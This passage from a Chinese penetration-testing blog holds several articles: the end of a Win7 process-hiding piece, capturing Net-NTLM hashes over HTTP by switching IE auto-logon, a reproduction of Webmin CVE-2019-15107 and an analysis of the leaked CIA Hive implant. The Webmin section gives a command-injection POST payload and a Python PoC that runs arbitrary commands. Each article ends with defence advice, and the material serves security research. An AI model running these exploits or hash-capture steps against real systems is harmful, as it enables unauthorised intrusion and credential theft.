<p>成功注入32位和64位进程</p>

<h2 id="0x04-补充">0x04 补充</h2>
<hr>

<p>该方法只支持Win7 和 Windows Server 2008 R2，不支持更高版本如Win8、Server2012</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-11/2-4.png" alt="Alt text"></p>

<p>如上图，在Win8系统，虽然成功加载AppInitHook.dll，但是无法隐藏进程</p>

<p><strong>原因如下：</strong></p>

<p>从Win8系统开始，微软对AppInit_DLLs做了限制：bios中默认开启的secure boot将会禁用AppInit_DLLs，使其失效</p>

<p>详情可参照：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/dn280412(v=vs.85).aspx</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>只针对Win7 和 Windows Server 2008 R2及以下系统</p>

<p><strong>1.查看注册表键值</strong></p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows]</code></p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows]</code></p>

<p>AppInit_DLLs项有无可疑dll路径</p>

<p><strong>2.通过Process Explorer查看进程有无加载可疑的dll</strong></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对利用global API hooks在Win7系统下隐藏进程的方法做了介绍，结合利用思路，帮助大家对这种利用方式进行更好的防御</p>

<p>当然，利用global API hooks能做的还有更多</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on April 11, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——通过HTTP协议获得Net-NTLM hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/">《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》</a>曾介绍了通过SMB协议获得登录用户Net-NTLM hash的方法，利用的前提是客户端通过界面使用SMB协议连接服务器时，默认先使用本机的用户名和密码hash尝试登录。</p>

<p>对于HTTP协议，也同样支持NTLM认证。那么，通过HTTP协议能否同样获得当前登录用户的Net-NTLM hash呢？限制条件有哪些？如何防御？本文将要逐一介绍。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>NTLM Over HTTP Protocol简介</li>
  <li>找出利用前提</li>
  <li>如何具体利用</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-ntlm-over-http-protocol简介">0x02 NTLM Over HTTP Protocol简介</h2>
<hr>

<p>官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/cc237488.aspx</p>

<p>参考资料：</p>

<p>https://www.innovation.ch/personal/ronald/ntlm.html</p>

<p>使用HTTP协议的NTLM认证流程：</p>

<ol>
  <li>客户端向服务器发送一个GET请求，请求获得网页内容</li>
  <li>服务器由于开启了NTLM认证，所以返回401，提示需要NTLM认证</li>
  <li>客户端发起NTLM认证，向服务器发送协商消息</li>
  <li>服务器收到消息后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端</li>
  <li>客户端接收到Challenge后，使用输入的密码hash对Challenge加密，生成response，将response发送给服务器</li>
  <li>服务器接收客户端加密后的response，经过同样的运算，比较结果，若匹配，提供后续服务，否则，认证失败</li>
</ol>

<p>直观的流程图，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片截取自https://www.innovation.ch/personal/ronald/ntlm.html，具体的消息格式可查看链接中的介绍</p>

<h3 id="实际测试">实际测试</h3>

<p>服务器：</p>

<ul>
  <li>OS: Server2012 R2</li>
  <li>IP: 192.168.62.136</li>
  <li>安装IIS服务</li>
</ul>

<p>客户端：</p>

<ul>
  <li>OS: Win7 x86</li>
  <li>IP: 192.168.62.134</li>
</ul>

<h4 id="1服务器开启ntlm认证">1、服务器开启NTLM认证</h4>

<p>进入IIS管理页面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-2.png" alt="Alt text"></p>

<p>选择<code class="language-plaintext highlighter-rouge">Authentication</code></p>

<p>关闭其他认证，只开启<code class="language-plaintext highlighter-rouge">Windows Authentication</code></p>

<p>添加<code class="language-plaintext highlighter-rouge">Provider</code>: <code class="language-plaintext highlighter-rouge">NTLM</code></p>

<p>配置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-3.png" alt="Alt text"></p>

<h4 id="2服务器运行wireshark进行抓包">2、服务器运行Wireshark，进行抓包</h4>

<p>只提取<code class="language-plaintext highlighter-rouge">HTTP</code></p>

<h4 id="3客户端访问服务器">3、客户端访问服务器</h4>

<p>弹框提示输入用户名密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-4.png" alt="Alt text"></p>

<p>此时服务器抓取的HTTP数据包如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-5.png" alt="Alt text"></p>

<p>对应流程1和2</p>

<h4 id="4客户端输入正确的用户名密码">4、客户端输入正确的用户名密码</h4>

<p>此时服务器抓取的HTTP数据包如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-6.png" alt="Alt text"></p>

<p>对应流程3-6</p>

<h4 id="5使用hashcat对该net-ntlm-hash进行破解">5、使用Hashcat对该Net-NTLM hash进行破解</h4>

<p>NTLMv2的格式为：</p>

<p><code class="language-plaintext highlighter-rouge">username::domain:challenge:HMAC-MD5:blob</code></p>

<p>通过数据包获得challenge，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-7.png" alt="Alt text"></p>

<p>通过数据包获得username、domain、HMAC-MD5和blob</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/2-8.png" alt="Alt text"></p>

<p>拼接格式，使用hash破解即可</p>

<p>详细细节可参考：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>中的0x03部分</p>

<h2 id="0x03-利用分析">0x03 利用分析</h2>
<hr>

<p>经过以上的测试，可以看到HTTP协议的破解同SMB协议类似，那么在利用上是否相同呢？</p>

<p>我们知道，使用SMB协议通过界面操作连接服务器时，默认先使用本机的用户名和密码hash尝试登录，而刚才的测试没有发现HTTP协议也具有这个特性</p>

<p>也就是说，只要用户不输入正确的用户口令，服务器就无法获得正确的Net-NTLM hash，无法进一步利用</p>

<p>并且，Responder和Inveigh的HTTP认证拦截功能也提到能够获得用户的hash，地址如下：</p>

<p>https://github.com/SpiderLabs/Responder#features</p>

<p>https://github.com/Kevin-Robertson/Inveigh</p>

<p>这个功能该如何使用？能够获得哪种hash？能不能获得客户端当前登录用户的hash？</p>

<p>我在IE浏览器的配置中找到了答案</p>

<p>打开IE浏览器，找到如下位置：</p>

<p><code class="language-plaintext highlighter-rouge">工具</code> -&gt; <code class="language-plaintext highlighter-rouge">Internet选项</code> -&gt; <code class="language-plaintext highlighter-rouge">安全</code> -&gt; <code class="language-plaintext highlighter-rouge">自定义级别</code> -&gt; <code class="language-plaintext highlighter-rouge">用户验证</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/3-1.png" alt="Alt text"></p>

<p>默认情况下，用户认证的登录方式为<code class="language-plaintext highlighter-rouge">Automatic logon only in Intranet zone</code></p>

<p>所以接下来需要做两个测试</p>

<h4 id="测试一">测试一</h4>

<p>将登录方式修改为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code></p>

<p>重启IE浏览器，再次测试</p>

<p>客户端通过IE访问服务器，弹出登录验证框，此时查看服务器的抓包情况</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-8/3-2.png" alt="Alt text"></p>

<p>发现客户端自动先使用本机的用户名和密码hash尝试登录，这时我们就能够通过进一步破解还原出用户口令，同SMB的利用思路一致</p>

<h4 id="测试二">测试二</h4>

<p>改为域环境，其他不变</p>

<p>客户端也会先使用本机的用户名和密码hash尝试登录</p>

<p>至此，我们找到了限定条件，通过HTTP协议获得当前登录用户的Net-NTLM hash适用于以下两种情况：</p>

<ol>
  <li>
    <p>客户端用户认证的登录方式为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code></p>
  </li>
  <li>
    <p>用户认证的登录方式默认不变，客户端同服务器需要在同一Intranet zone</p>
  </li>
</ol>

<p>同样，这也是Responder和Inveigh支持HTTP协议用户hash获取的利用前提</p>

<h2 id="0x04-具体利用方法">0x04 具体利用方法</h2>
<hr>

<p>1、Intranet zone下使用Responder和Inveigh</p>

<p>如果是在工作组环境下，无法获得当前登录用户的Net-NTLM hash，可在域环境下使用</p>

<p>2、已获得客户端权限，修改用户认证方式</p>

<p>对应注册表<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3</code>下的键<code class="language-plaintext highlighter-rouge">1A00</code></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0</code>表示自动使用当前用户名和密码登录</li>
  <li><code class="language-plaintext highlighter-rouge">10000</code>表示用户名和密码提示</li>
  <li><code class="language-plaintext highlighter-rouge">20000</code>表示只在Intranet区域自动登录，默认值</li>
  <li><code class="language-plaintext highlighter-rouge">30000</code>表示匿名登录</li>
</ul>

<p>如果将客户端用户认证的登录方式修改为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code>，那么客户端在访问任何需要登录验证的网站都会先使用本机的用户名和密码hash尝试登录</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>结合利用思路，在此提出防御建议：</p>

<p>用户认证方式应禁止设置为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code>，对应注册表键值禁止被修改为0</p>

<p>查询命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /v 1A00
</code></pre></div></div>

<p>否则，很有可能被破解出客户端当前登录用户的口令</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过HTTP协议获得客户端当前登录用户Net-NTLM hash的方法，找到限制条件(Intranet zone下或者用户认证方式被修改为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code>)，限制条件同样适用于Responder和Inveigh的HTTP认证拦截功能，最后给出防御建议： 用户认证方式应禁止设置为<code class="language-plaintext highlighter-rouge">Automatic logon with current user name and password</code></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  8, 2018
  </div>

  
</article><article class="post">
  <h1>Webmin&lt;=1.920-Unauthenticated_RCE(CVE-2019-15107)利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2019年8月10日，Ozkan(@ehakkus)在DEFCON AppSec Village公开了一个0 day，1.930以下版本的Webmin存在远程代码执行漏洞，文章地址如下：</p>

<p>https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html</p>

<p>我对这个漏洞进行了跟踪研究，本文将要记录测试过程，根据漏洞原理使用Python编写一个POC，并给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>漏洞简介</li>
  <li>搭建测试环境</li>
  <li>使用Burp Suite复现漏洞</li>
  <li>使用Python编写POC</li>
</ul>

<h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
<hr>

<p>Webmin是基于Web的Unix系统管理工具，简单理解：使用Webmin能够通过浏览器远程管理Unix系统的主机</p>

<p>1.930以下版本的Webmin存在远程代码执行漏洞，当Webmin的<code class="language-plaintext highlighter-rouge">Password expiry policy</code>设置为<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>时(默认设置为<code class="language-plaintext highlighter-rouge">Always deny users with expired passwords</code>)，通过构造特殊格式的POST包，能够实现远程代码执行</p>

<h2 id="0x03-搭建测试环境和漏洞复现">0x03 搭建测试环境和漏洞复现</h2>
<hr>

<p>测试系统： Centos7 x64
IP：192.168.112.181</p>

<h3 id="1安装perl和依赖库">1.安装perl和依赖库</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yum -y install perl
yum -y install perl-Net-SSLeay
yum -y install perl-Encode-Detect
</code></pre></div></div>

<h3 id="2下载并安装存在漏洞的webadmin1920">2.下载并安装存在漏洞的Webadmin(1.920)</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://sourceforge.net/projects/webadmin/files/webmin/1.920/webmin-1.920-1.noarch.rpm
rpm -U webmin-1.920-1.noarch.rpm
</code></pre></div></div>

<p>安装成功后Webadmin默认开启SSL</p>

<h3 id="3配置防火墙打开10000端口支持远程访问">3.配置防火墙，打开10000端口，支持远程访问</h3>

<p>添加10000端口：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --zone=public --add-port=10000/tcp --permanent
</code></pre></div></div>

<p>重启防火墙：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --reload
</code></pre></div></div>

<p>查看端口号是否开启：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --query-port=10000/tcp
</code></pre></div></div>

<h3 id="4远程登录">4.远程登录</h3>

<p>https://192.168.112.181:10000</p>

<p>登录页面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-1.png" alt="Alt text"></p>

<p>使用Centos的root用户口令进行登录</p>

<p><strong>注：</strong></p>

<p>为了便于测试，可以先关闭SSL功能，位置为：<code class="language-plaintext highlighter-rouge">Webmin Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">SSL Encryption</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-2.png" alt="Alt text"></p>

<p>新的登录页面为http://192.168.112.181:10000</p>

<h3 id="5修改password-expiry-policy">5.修改Password expiry policy</h3>

<p>位置为：<code class="language-plaintext highlighter-rouge">Webmin Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Authentication</code></p>

<p>默认为<code class="language-plaintext highlighter-rouge">Always deny users with expired passwords</code></p>

<p>修改为<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new on</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-3.png" alt="Alt text"></p>

<h3 id="6添加新用户">6.添加新用户</h3>

<p>位置为：<code class="language-plaintext highlighter-rouge">Webmin Users</code></p>

<p>添加用户成功后，修改Password选项，添加<code class="language-plaintext highlighter-rouge">Force change at next login</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-4.png" alt="Alt text"></p>

<h3 id="7使用新用户登录">7.使用新用户登录</h3>

<p>提示需要修改密码</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-5.png" alt="Alt text"></p>

<h3 id="8开启burp-suite进行抓包">8.开启Burp Suite进行抓包</h3>

<p>任意输入旧口令和新的口令</p>

<p>Burp Suite抓包如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-6.png" alt="Alt text"></p>

<p>正常的返回结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-7.png" alt="Alt text"></p>

<h3 id="9修改post包添加payload">9.修改POST包，添加Payload</h3>

<p>重复步骤8，并修改POST包</p>

<p>原数据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=a&amp;pam=&amp;expired=2&amp;old=123&amp;new1=456&amp;new2=456
</code></pre></div></div>

<p>新数据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=a&amp;pam=&amp;expired=2&amp;old=123|id&amp;new1=456&amp;new2=456
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-8.png" alt="Alt text"></p>

<p>新的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-9.png" alt="Alt text"></p>

<p>执行了命令(<code class="language-plaintext highlighter-rouge">id</code>)并输出结果</p>

<h2 id="0x04-使用python编写poc">0x04 使用Python编写POC</h2>
<hr>

<p>Ozkan(@ehakkus)在他的文章中使用ruby编写了POC，这里使用Python根据Burp Suite的抓包情况重写一个POC</p>

<p>需要考虑以下问题：</p>

<h3 id="1python使用requests发送post包">1.Python使用requests发送POST包</h3>

<p>POST包格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-6.png" alt="Alt text"></p>

<p>对应Python使用requests发送POST包的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
def test_post_http(ip,command):
    try:
        url = 'http://' + ip + ':10000/password_change.cgi'
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': "gzip, deflate",
            'Referer': 'http://' + ip + ':10000/session_login.cgi',
            'Cookie': 'redirect=1; testing=1; sid=x',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '47'
        } 
        payload = 'user=a&amp;pam=&amp;expired=2&amp;old=test|' + command + '&amp;new1=test1&amp;new2=test1'
        r = requests.post(url, data=payload, headers = headers)
    	print r.text
    except Exception as e:
            print '[!]Error:%s'%e
</code></pre></div></div>

<h3 id="2添加对结果的识别">2.添加对结果的识别</h3>

<p>如果Webmin未开启<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>，结果为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;Error - Perl execution failed&lt;/h1&gt;
&lt;p&gt;Password changing is not enabled! at /usr/libexec/webmin/password_change.cgi line 12.
&lt;/p&gt;
</code></pre></div></div>

<p>如果Webmin使用https，结果为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;Error - Document follows&lt;/h1&gt;
&lt;pre&gt;This web server is running in SSL mode. Try the URL &lt;a href='https://webmin-node-reddis:10000/'&gt;https://webmin-node-reddis:10000/&lt;/a&gt; instead.&lt;br&gt;&lt;/pre&gt;
</code></pre></div></div>

<p>如果Webmin开启<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>，结果为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;hr&gt;
&lt;center&gt;&lt;h3&gt;Failed to change password : The current password is incorrect&lt;/h3&gt;&lt;/center&gt;
&lt;hr&gt;
</code></pre></div></div>

<h3 id="3添加对https的支持">3.添加对HTTPS的支持</h3>

<p>如果结果为<code class="language-plaintext highlighter-rouge">This web server is running in SSL mode.</code>，那么跳转到HTTPS再次测试</p>

<p>另外，需要取消证书验证</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = requests.post(url, data=payload, headers = headers)
</code></pre></div></div>

<p>新代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = requests.post(url, data=payload, headers = headers, verify = False)
</code></pre></div></div>

<p>取消证书的ssl-warning，添加代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import warnings
warnings.filterwarnings("ignore")
</code></pre></div></div>

<p>否则，会提示：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Python27\lib\site-packages\urllib3-1.25.3-py2.7.egg\urllib3\connectionpool.py:851: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: ttps://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings  InsecureRequestWarning)
</code></pre></div></div>

<p>完整测试代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/Webmin%3C=1.920-Unauthenticated_RCE(CVE-2019-15107).py</p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>1.升级至1.930</p>

<p>2.<code class="language-plaintext highlighter-rouge">Password expiry policy</code>采用默认设置</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Webmin&lt;=1.920的远程代码执行进行测试，记录过程，根据漏洞原理使用Python编写一个POC，并给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August 16, 2019
  </div>

  
</article><article class="post">
  <h1>CIA Hive测试指南——源代码获取与简要分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>11月9日维基解密公布一个代号为Vault8的文档，包含服务器远程控制工具Hive的源代码和开发文档。本文仅站在技术角度，介绍测试方法，简要分析工具特点。</p>

<p>维基解密地址：</p>

<p>https://wikileaks.org/vault8/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>源代码获取方法</li>
  <li>框架流程分析</li>
  <li>工具具体说明</li>
  <li>特点分析</li>
</ul>

<h2 id="0x02-源代码获取">0x02 源代码获取</h2>
<hr>

<p>下载地址：</p>

<p>https://wikileaks.org/vault8/document/repo_hive/</p>

<p>代码库中的文件创建于在2013年8月和2015年10月之间，但工具Hive的开发时间应该更早</p>

<p>维基解密以git的方式公布该代码，包含以下几个分支：</p>

<ul>
  <li>armv5</li>
  <li>autotools</li>
  <li>debug</li>
  <li>dhm</li>
  <li>makemods</li>
  <li>master(默认)</li>
  <li>mt6</li>
  <li>polar-0.14.3</li>
  <li>polar-1.1.8</li>
  <li>polar-1.2.11</li>
  <li>polar-1.3.4</li>
  <li>solarisbug</li>
  <li>ubiquiti</li>
</ul>

<p>下载后发现并不包含相关源代码，需要使用git释放源代码</p>

<p><strong>注：</strong></p>

<p>这种方式能够减小源代码体积(下载文件大小95.5MB，实际文件大小170MB)</p>

<h3 id="1安装git">1、安装git</h3>

<p>kali2默认安装，未安装的Linux系统使用以下安装命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo yum install git
</code></pre></div></div>

<p>Windows系统下载地址：</p>

<p>https://git-for-windows.github.io/</p>

<p>使用如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/1-1.png" alt="Alt text"></p>

<h3 id="2常用git命令">2、常用git命令</h3>

<p>查看所有分支,当前分支会被星号标示出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git branch
</code></pre></div></div>

<p>当前分支为master，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/2-1.png" alt="Alt text"></p>

<p>查看历史版本：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log
</code></pre></div></div>

<p>查看git状态，能够列出被修改但还未提交的文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git status
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/2-2.png" alt="Alt text"></p>

<p>切换分支：</p>

<p><code class="language-plaintext highlighter-rouge">git checkout -b (branchname)</code></p>

<p>由于当前操作并未提交，所以恢复删除的文件使用.即可，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout .
</code></pre></div></div>

<p>成功释放出master分支下的代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/2-3.png" alt="Alt text"></p>

<p><strong>补充切换版本的方法：</strong></p>

<p>查看版本号：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git reflog
</code></pre></div></div>

<p>切换版本至polar-1.3.4：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout polar-1.3.4
</code></pre></div></div>

<h2 id="0x03-框架分析">0x03 框架分析</h2>
<hr>

<p>结合框架图对Hive进行分析</p>

<p>原图片来自<code class="language-plaintext highlighter-rouge">\hive\infrastructure\documentation\Hive Operating Environment.odp</code></p>

<p>我在原图片的基础上做了标记，便于分析，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/4-1.png" alt="Alt text"></p>

<h3 id="1-client">(1) Client</h3>

<p>相当于木马的被控端，通过hive-patcher生成</p>

<p>支持以下系统：</p>

<ul>
  <li>mt-x86</li>
  <li>mt-mips</li>
  <li>mt-mipsel</li>
  <li>mt-ppc</li>
  <li>linux-x86</li>
  <li>sol-x86</li>
  <li>sol-sparc</li>
</ul>

<p>可使用以下目录的不同版本：</p>

<ul>
  <li>hive\snapshot_20141217-1052\clientDirectory</li>
  <li>hive\snapshot_20141107-1345\clientDirectory</li>
  <li>hive\snapshot_20141017-1409\clientDirectory</li>
</ul>

<p>测试使用<code class="language-plaintext highlighter-rouge">hive\snapshot_20141107-1345\clientDirectory</code></p>

<p>用法如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hive-patcher -a address [-d b_delay] [-i interval] (-k idKey | -K idKeyFile) [-I interface] [-p port] [-t t_delay] [-m OS] 
</code></pre></div></div>

<p>该工具的详细说明可参考用户文档，位于<code class="language-plaintext highlighter-rouge">\hive\documentation\UsersGuide\UsersGuide.odt</code>, <code class="language-plaintext highlighter-rouge">2.3 (S) Patcher</code></p>

<p>实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hive-patcher -a 192.168.81.192 -p 4567 -i 3600 -j 5 -m linux-x86 -k "Testing Testing"
</code></pre></div></div>

<p>生成过程会显示配置信息，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-12/4-2.png" alt="Alt text"></p>

<h3 id="2-端口转发">(2) 端口转发</h3>

<p>VPS Redirector，第一跳板，实现流量转发功能</p>

<p>详细配置可参考：</p>

<p><code class="language-plaintext highlighter-rouge">\hive\infrastructure\documentation\Infrastructure Configuration Guide.odt</code>， <code class="language-plaintext highlighter-rouge">6 	(S//NF) VPS Redirector</code></p>

<h3 id="3-中转服务器">(3) 中转服务器</h3>

<p>Blot Proxy，第二跳板，实现流量分发功能。使用OpenVPN同VPS Redirector进行通信，对Client的证书进行校验，若证书有效，流量转发至Honeycomb服务器，若证书存在问题，流量转发至CoverServer</p>

<p>详细说明可参考：</p>

<p><code class="language-plaintext highlighter-rouge">\hive\infrastructure\documentation\Infrastructure Configuration Guide.odt</code>， <code class="language-plaintext highlighter-rouge">5 	(S//NF) Blot Proxy</code></p>

<p>需要安装<code class="language-plaintext highlighter-rouge">Blot-4.3 sinnertwin-blot-beastbox-1.3-1</code></p>

<p>具体功能通过Switchblade实现</p>

<h4 id="switchblade">Switchblade：</h4>

<p>通过开源Web服务器Nginx和LinuxIP路由策略实现流量分发</p>

<p>详细配置可参考：</p>

<p><code class="language-plaintext highlighter-rouge">\hive\infrastructure\documentation\Switchblade.odt</code></p>

<h3 id="4-server">(4) Server</h3>

<p>控制端，分为CoverServer和Honeycomb</p>

<h4 id="coverserver">CoverServer：</h4>

<p>提供正常的网页功能，可根据不同端口返回不同的域名信息</p>

<p>详细配置可参考：</p>

<p><code class="language-plaintext highlighter-rouge">\hive\infrastructure\documentation\Infrastructure Configuration Guide.odt</code>， <code class="language-plaintext highlighter-rouge">3 	(S//NF) Cover Server</code></p>

